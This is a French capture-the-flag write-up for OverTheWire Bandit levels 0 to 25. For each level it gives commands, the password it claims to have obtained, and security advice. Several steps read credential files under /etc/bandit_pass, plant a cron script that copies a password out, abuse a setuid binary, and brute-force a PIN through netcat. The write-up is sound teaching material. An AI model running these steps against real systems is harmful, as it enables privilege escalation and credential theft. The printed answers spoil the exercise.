# 🔐 OverTheWire Bandit — Compte Rendu

**Wargame :** [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)  
**Objectif :** Progression niveau par niveau en exploitant des vulnérabilités Linux/SSH  
**Connexion :** `ssh bandit{N}@bandit.labs.overthewire.org -p 2220`

---

## 📌 Introduction

OverTheWire Bandit est un wargame pédagogique pour débutants en cybersécurité. Chaque niveau présente un défi où il faut trouver un mot de passe caché pour accéder au niveau suivant.

**Techniques abordées :**
- Navigation et manipulation de fichiers Linux
- Permissions et droits d'accès
- Encodages et chiffrement
- Connexions réseau et protocoles
- Scripts shell et Python

---

## 🐍 Script Python de connexion

```python
import paramiko

def connect_bandit(level: int, password: str):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        "bandit.labs.overthewire.org",
        port=2220,
        username=f"bandit{level}",
        password=password
    )
    return client

def run_command(client, command: str) -> str:
    _, stdout, _ = client.exec_command(command)
    return stdout.read().decode().strip()
```

---

## 📋 Niveaux

---

### Niveau 0 → 1
**Commande :** `cat ~/readme`  
**Concept :** Connexion SSH basique, lecture de fichier  
**Vulnérabilité :** Credentials par défaut (`bandit0/bandit0`)  
**Password :** `ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If`

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
cat ~/readme
```

**Solution proposée :** Ne jamais utiliser des credentials par défaut en production.

---

### Niveau 1 → 2
**Commande :** `cat ./-`  
**Concept :** Fichiers avec noms spéciaux (tiret)  
**Vulnérabilité :** Mauvaise gestion des caractères spéciaux dans les noms de fichiers  
**Password :** `263JGJPfgU6LtdEvgfWU1XP5yac29mFx`

```bash
cat ./-
```

**Solution proposée :** Toujours valider et échapper les noms de fichiers en entrée utilisateur.

---

### Niveau 2 → 3
**Commande :** `cat ./"--spaces in this filename--"`  
**Concept :** Fichiers avec espaces et tirets dans le nom  
**Vulnérabilité :** Parsing incorrect des noms de fichiers contenant des espaces  
**Password :** `MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx`

```bash
cat ./"--spaces in this filename--"
```

**Solution proposée :** Sanitizer les noms de fichiers, éviter les caractères spéciaux.

---

### Niveau 3 → 4
**Commande :** `cat inhere/...Hiding-From-You`  
**Concept :** Fichiers cachés (dot files)  
**Vulnérabilité :** Stockage d'informations sensibles dans des fichiers cachés  
**Password :** `2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ`

```bash
ls -la inhere/
cat inhere/...Hiding-From-You
```

**Solution proposée :** Ne jamais stocker de secrets dans des fichiers cachés. Utiliser des gestionnaires de secrets (Vault, AWS Secrets Manager).

---

### Niveau 4 → 5
**Commande :** `file ./-file0*` puis `cat ./-file07`  
**Concept :** Identification du type de fichier  
**Password :** `4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw`

```bash
file inhere/-file0*
cat inhere/-file07
```

---

### Niveau 5 → 6
**Commande :** `find inhere/ -type f -size 1033c ! -executable`  
**Concept :** Recherche de fichiers avec propriétés spécifiques  
**Password :** `HWasnPhtq9AVKe0dmk45nxy20cvUa6EG`

```bash
find inhere/ -type f -size 1033c ! -executable
cat inhere/maybehere07/.file2
```

---

### Niveau 6 → 7
**Commande :** `find / -user bandit7 -group bandit6 -size 33c 2>/dev/null`  
**Concept :** Recherche système par propriétaire et groupe  
**Password :** `morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj`

```bash
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
cat /var/lib/dpkg/info/bandit7.password
```

---

### Niveau 7 → 8
**Commande :** `grep "millionth" data.txt`  
**Concept :** Recherche dans un grand fichier texte  
**Password :** `dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc`

```bash
grep "millionth" data.txt
```

---

### Niveau 8 → 9
**Commande :** `sort data.txt | uniq -u`  
**Concept :** Trouver la ligne unique parmi des doublons  
**Password :** `4CKMh1JI91bUIZZPXDqGanal4xvAg0JM`

```bash
sort data.txt | uniq -u
```

---

### Niveau 9 → 10
**Commande :** `strings data.txt | grep "="`  
**Concept :** Extraction de chaînes lisibles dans un fichier binaire  
**Password :** `FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey`

```bash
strings data.txt | grep "=="
```

---

### Niveau 10 → 11
**Commande :** `base64 -d data.txt`  
**Concept :** Décodage Base64  
**Vulnérabilité :** Base64 ≠ chiffrement — fausse sécurité par obscurcissement  
**Password :** `dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr`

```bash
base64 -d data.txt
```

**Solution proposée :** Utiliser AES-256 ou RSA pour les données sensibles, pas Base64.

---

### Niveau 11 → 12
**Commande :** `cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'`  
**Concept :** Décodage ROT13  
**Vulnérabilité :** Chiffrement par substitution trivial, aucune valeur sécuritaire  
**Password :** `7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4`

```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

### Niveau 12 → 13
**Commande :** Décompression itérative (gzip → bzip2 → tar → ...)  
**Concept :** Identification et décompression de formats multiples imbriqués  
**Password :** `FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn`

```bash
mkdir /tmp/mywork && cd /tmp/mywork
cp ~/data.txt .
xxd -r data.txt > data.bin
# Identifier: file data.bin
# gzip:  mv data.bin data.bin.gz && gunzip data.bin.gz
# bzip2: mv data.bin data.bin.bz2 && bunzip2 data.bin.bz2
# tar:   tar -xf data.bin
# Répéter jusqu'à obtenir un fichier ASCII text
cat data8.bin
```

---

### Niveau 13 → 14
**Commande :** `scp` + `ssh -i sshkey.private`  
**Concept :** Authentification par clé SSH privée RSA  
**Password :** `MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS`

```bash
scp -P 2220 bandit13@bandit.labs.overthewire.org:sshkey.private ./sshkey.private
chmod 600 sshkey.private
ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
cat /etc/bandit_pass/bandit14
```

---

### Niveau 14 → 15
**Commande :** `echo "password" | nc localhost 30000`  
**Concept :** Communication réseau via netcat  
**Password :** `8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo`

```bash
echo "MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS" | nc localhost 30000
```

---

### Niveau 15 → 16
**Commande :** `openssl s_client`  
**Concept :** Communication chiffrée SSL/TLS  
**Password :** `kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx`

```bash
echo "8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo" | openssl s_client -connect localhost:30001 -quiet
```

---

### Niveau 16 → 17
**Commande :** `nmap` + `openssl s_client` sur le bon port  
**Concept :** Scan de ports + identification du service SSL  
**Password :** Clé SSH RSA privée reçue via port 31790

```bash
nmap -p 31000-32000 localhost
echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client -connect localhost:31790 -quiet 2>/dev/null
# Sauvegarder la clé RSA reçue et l'utiliser pour le niveau suivant
```

---

### Niveau 17 → 18
**Commande :** `diff passwords.old passwords.new`  
**Concept :** Comparaison de fichiers  
**Password :** `x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO`

```bash
diff passwords.old passwords.new
# La ligne avec '>' est le nouveau password
```

---

### Niveau 18 → 19
**Commande :** `ssh bandit18@... "cat ~/readme"`  
**Concept :** Bypass d'un `.bashrc` malveillant  
**Vulnérabilité :** Modification du `.bashrc` pour bloquer la connexion interactive  
**Password :** `cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8`

```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat ~/readme"
```

---

### Niveau 19 → 20
**Commande :** `./bandit20-do cat /etc/bandit_pass/bandit20`  
**Concept :** Exploitation d'un binaire setuid  
**Vulnérabilité :** Binary setuid — élévation de privilèges  
**Password :** `0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO`

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

---

### Niveau 20 → 21
**Commande :** `nc -lp 1234 &` + `./suconnect 1234`  
**Concept :** Communication réseau locale  
**Password :** `EeoULMCra2q0dSkYj561DX7s1CpBuOBt`

```bash
echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -lp 1234 &
./suconnect 1234
```

---

### Niveau 21 → 22
**Commande :** Analyse cron + lecture du fichier temporaire  
**Concept :** Exploitation de tâches cron  
**Password :** `tRae0UFB9v0UzbCdn9cY0gQnds9GF58Q`

```bash
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

---

### Niveau 22 → 23
**Commande :** Calcul MD5 + lecture du fichier résultant  
**Concept :** Reverse engineering d'un script cron avec MD5  
**Password :** `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

```bash
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
# → 8ca319486bfbbc3663ea0fbe81326349
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```

---

### Niveau 23 → 24
**Commande :** Injection d'un script dans le dossier cron  
**Concept :** Exploitation d'un cron job exécutant des scripts tiers  
**Vulnérabilité :** Dossier cron accessible en écriture par un utilisateur non privilégié  
**Password :** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

```bash
mkdir /tmp/mypass24x && chmod 777 /tmp/mypass24x
cat > /var/spool/bandit24/foo/getpass.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mypass24x/password.txt
chmod 777 /tmp/mypass24x/password.txt
EOF
chmod +x /var/spool/bandit24/foo/getpass.sh
sleep 60 && cat /tmp/mypass24x/password.txt
```

**Solution proposée :** Restreindre les permissions des dossiers exécutés par cron, utiliser des chemins absolus.

---

### Niveau 24 → 25
**Commande :** Brute-force PIN 0000-9999 via netcat  
**Concept :** Attaque par force brute sur un PIN à 4 chiffres  
**Vulnérabilité :** Absence de rate limiting, PIN trop court (10 000 combinaisons)  
**Password :** `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`

```bash
for i in $(seq -w 0 9999); do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done | nc localhost 30002 | grep -v Wrong
```

**Solution proposée :** Rate limiting, blocage après N tentatives, tokens à usage unique, PIN plus long.

---

## 📊 Tableau Récapitulatif des Vulnérabilités

| Niveau | Technique | Vulnérabilité | Criticité |
|--------|-----------|---------------|-----------|
| 0→1 | SSH basique | Credentials par défaut | 🔴 Haute |
| 1→2 | Fichiers spéciaux | Noms de fichiers non sanitizés | 🟡 Moyenne |
| 3→4 | Dot files | Secrets dans fichiers cachés | 🔴 Haute |
| 10→11 | Base64 | Fausse sécurité par obscurcissement | 🔴 Haute |
| 11→12 | ROT13 | Chiffrement trivial | 🔴 Haute |
| 18→19 | .bashrc modifié | Persistance malveillante | 🔴 Haute |
| 19→20 | Binary setuid | Élévation de privilèges | 🔴 Haute |
| 23→24 | Cron injection | Exécution de code arbitraire | 🔴 Critique |
| 24→25 | Brute-force | Absence de rate limiting | 🔴 Haute |

---

## 🛡️ Recommandations Générales de Sécurité

1. **Ne jamais utiliser des credentials par défaut**
2. **Base64 ≠ Chiffrement** → Utiliser AES-256 ou RSA pour les données sensibles
3. **Valider toutes les entrées** → Surtout les noms de fichiers et chemins
4. **Principle of Least Privilege** → Chaque utilisateur n'a accès qu'au nécessaire
5. **Sécuriser les cron jobs** → Vérifier les permissions des dossiers exécutés
6. **Rate limiting** → Bloquer les attaques brute-force
7. **Gestion des secrets** → Utiliser HashiCorp Vault, AWS Secrets Manager

---

## 🔧 Dépendances Python

```bash
pip install paramiko
```

---

> ⚠️ **Note éthique :** Ce writeup est réalisé dans un cadre pédagogique sur des systèmes autorisés uniquement.

